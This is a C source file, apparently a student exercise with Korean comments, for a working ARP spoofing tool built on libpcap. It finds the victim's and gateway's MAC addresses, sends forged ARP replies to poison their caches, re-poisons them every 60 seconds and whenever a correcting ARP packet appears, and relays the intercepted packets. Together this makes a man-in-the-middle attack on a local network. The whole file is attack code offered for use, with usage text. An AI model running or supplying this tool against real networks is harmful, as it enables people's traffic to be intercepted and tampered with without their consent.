#include <pcap.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <time.h>
#include <stdbool.h>  // true, false를 사용하기 위해 포함

#define PACKET_LEN 42  // PACKET_LEN을 매크로로 정의하여 상수로 사용

static const int ARP_REQUEST = 1;
static const int ARP_REPLY = 2;
static const int TYPE_ARP = 0x0806;
static const int TYPE_IPV4 = 0x0800;
static const int HARDWARE_TYPE = 0x01;
static const int HARDWARE_SIZE = 0x06;
static const int PROTOCOL_SIZE = 0x04;

static const int REPOISONING_INTERVAL = 60;

struct EthHdr {
    char dst_mac[6];
    char src_mac[6];
    uint16_t type;
};

struct ArpHdr {
    uint16_t hardware_addr_type;
    uint16_t protocol_addr_type;
    uint8_t hardware_addr_len;
    uint8_t protocol_addr_len;
    uint16_t opcode;
    char sender_mac[6];
    char sender_ip[4];
    char target_mac[6];
    char target_ip[4];
};

struct EthArp {
    struct EthHdr eth;
    struct ArpHdr arp;
};

pcap_t* handle;

struct ifreq ifr;
unsigned char my_mac[6] = {};
unsigned char src_mac[6] = {};
unsigned char dst_mac[6] = {};

uint32_t sender_ip = 0;
uint32_t target_ip = 0;
uint32_t my_ip = 0;

int mode = 0;

time_t begin, end;

struct EthArp* ethArp;

int pid = 0;

void initTimeStamp(int offset) {
    begin = time(NULL) + offset;
}

int checkTime(int sec) {
    end = time(NULL);

    if (end - begin >= sec) {
        begin = end;
        return 1;
    }
    return 0;
}

void usage() {
    printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample: arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void printMac(u_char* buf) {
    printf("%02x:%02x:%02x:%02x:%02x:%02x", buf[0], buf[1], buf[2], buf[3], buf[4], buf[5]);
}

void printIP(u_char* buf) {
    printf("%d.%d.%d.%d", buf[0], buf[1], buf[2], buf[3]);
}

int sendArp(pcap_t* handle, uint32_t sender_ip, uint32_t target_ip, uint16_t type) {
    u_char buf[PACKET_LEN];  // 함수 내부에서 배열 선언

    ethArp = (struct EthArp*) &buf[0];

    if (type == ARP_REQUEST) {
        memcpy(ethArp->eth.dst_mac, "\xff\xff\xff\xff\xff\xff", 6); 
    } else if (type == ARP_REPLY) {
        memcpy(ethArp->eth.dst_mac, dst_mac, 6); 
    }

    memcpy(ethArp->eth.src_mac, my_mac, 6);
    ethArp->eth.type = htons(TYPE_ARP);

    ethArp->arp.hardware_addr_type = htons(HARDWARE_TYPE);
    ethArp->arp.protocol_addr_type = htons(TYPE_IPV4);
    ethArp->arp.hardware_addr_len = HARDWARE_SIZE;
    ethArp->arp.protocol_addr_len = PROTOCOL_SIZE;
    ethArp->arp.opcode = htons(type);

    memcpy(ethArp->arp.sender_mac, my_mac, 6);
    memcpy(ethArp->arp.sender_ip, (char*)&sender_ip, 4);

    if (type == ARP_REQUEST) {
        memcpy(ethArp->arp.target_mac, "\x00\x00\x00\x00\x00\x00", 6);
    } else if (type == ARP_REPLY) {
        if (mode == 0) memcpy(ethArp->arp.target_mac, src_mac, 6);
        else memcpy(ethArp->arp.target_mac, dst_mac, 6);
    }

    memcpy(ethArp->arp.target_ip, (char*)&target_ip, 4);

    if (type == ARP_REQUEST) {
        printf("[*] %05d : who is (", pid);
        printIP((u_char*)&target_ip);
        printf(") ?\n");
    } else if (type == ARP_REPLY) {
        printf("[*] %05d : (", pid);
        printIP((u_char*)&sender_ip);
        printf(") is at (");
        printMac((u_char*)my_mac);
        printf(")\n");
    }

    if (pcap_sendpacket(handle, buf, PACKET_LEN) != 0) {
        fprintf(stderr, "[*] %05d : couldn't send packet : %s\n", pid, pcap_geterr(handle));
        return -1;
    }

    return 0;
}

void getMyMac(char *dev) {
    int fd;
    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name , dev , IFNAMSIZ - 1);

    ioctl(fd, SIOCGIFHWADDR, &ifr);
    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);
}

void getMyIP(char *dev) {
    int fd;
    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name , dev , IFNAMSIZ - 1);

    ioctl(fd, SIOCGIFADDR, &ifr);
    my_ip = *(uint32_t*)&(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
}

int isCorrection(const struct EthArp* ethArp) {
    if ((strncmp(ethArp->arp.target_mac, (char*) my_mac, 6) == 0
        || strncmp(ethArp->arp.target_mac, "\xff\xff\xff\xff\xff\xff", 6) == 0)
            && *(uint32_t*)ethArp->arp.target_ip == target_ip) {
        return 1;
    }
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2) {
        usage();
        return -1;
    }

    char* dev = argv[1];

    for (size_t i = 1 ; i < argc / 2; ++i) {
        if (pid = fork()) {
            sender_ip = inet_addr(argv[i * 2]);
            target_ip = inet_addr(argv[i * 2 + 1]);
            break;
        }
    }

    if (pid == 0) return 0;

    getMyMac(dev);
    getMyIP(dev);

    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    if (handle == NULL) {
        fprintf(stderr, "[*] %05d : couldn't open device %s : %s\n", pid, dev, errbuf);
        return -1;
    }

    // check victim mac address

    label1:

    initTimeStamp(0);

    if (sendArp(handle, my_ip, sender_ip, ARP_REQUEST) != 0) {
        fprintf(stderr, "[*] %05d : couldn't send request\n", pid);
        return -1;
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);

        if (checkTime(2)) {
            goto label1;
        }

        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        ethArp = (struct EthArp*) packet;
        if (ethArp->eth.type != htons(TYPE_ARP)) continue;
        if (memcmp(ethArp->arp.target_mac, (char*) my_mac, 6)) continue;
        if (*(uint32_t*)ethArp->arp.sender_ip != sender_ip) continue;

        memcpy(dst_mac, ethArp->arp.sender_mac, 6);

        printf("[*] %05d : (", pid);
        printIP((u_char*)&sender_ip);
        printf(") is at (");
        printMac(dst_mac);
        printf(")\n");
    
        break;
    }

    // check gateway mac address

    label2:

    initTimeStamp(0);

    if (sendArp(handle, my_ip, target_ip, ARP_REQUEST)) {
        fprintf(stderr, "[*] %05d : couldn't send request\n", pid);
        return -1;
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);

        if (checkTime(2)) {
            goto label2;
        }

        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        ethArp = (struct EthArp*) packet;
        if (ethArp->eth.type != htons(TYPE_ARP)) continue;
        if (memcmp(ethArp->arp.target_mac, (char*) my_mac, 6)) continue;
        if (*(uint32_t*)ethArp->arp.sender_ip != target_ip) continue;

        memcpy(src_mac, ethArp->arp.sender_mac, 6);
    
        printf("[*] %05d : (", pid);
        printIP((u_char*)&target_ip);
        printf(") is at (");
        printMac(src_mac);
        printf(")\n");
    
        break;
    }

    mode = 1;

    initTimeStamp(-REPOISONING_INTERVAL);

    if (fork()) {

        while (true) {
            struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(handle, &header, &packet);

            if (res == 0) continue;
            if (res == -1 || res == -2) break;

            ethArp = (struct EthArp*) packet;
            if (ethArp->eth.type != htons(TYPE_ARP)) {

                // relay packets
                if (memcmp(ethArp->eth.src_mac, dst_mac, 6) == 0 && memcmp(ethArp->eth.dst_mac, my_mac, 6) == 0) {

                    memcpy(ethArp->eth.src_mac, my_mac, 6);
                    memcpy(ethArp->eth.dst_mac, src_mac, 6);

                    if (pcap_sendpacket(handle, packet, header->len) != 0) {
                        fprintf(stderr, "[*] %05d : couldn't send packet : %s\n", pid, pcap_geterr(handle));
                        return -1;
                    }
                }

                continue;
            }
            
            if (isCorrection(ethArp)) {
                printf("[*] %05d : Correction detected!\n", pid);

                if (sendArp(handle, target_ip, sender_ip, ARP_REPLY) != 0) {
                    fprintf(stderr, "[*] %05d : couldn't send reply\n", pid);
                    return -1;
                }
            }
        }

    } else {

        while (true) {
            if (checkTime(REPOISONING_INTERVAL)) { 
                if (sendArp(handle, target_ip, sender_ip, ARP_REPLY) != 0) {
                    fprintf(stderr, "[*] %05d : couldn't send reply\n", pid);
                    return -1;
                }
            }
            sleep(1);
        }
    }

    printf("[*] %05d : process exited!\n", pid);

    return 0;
}

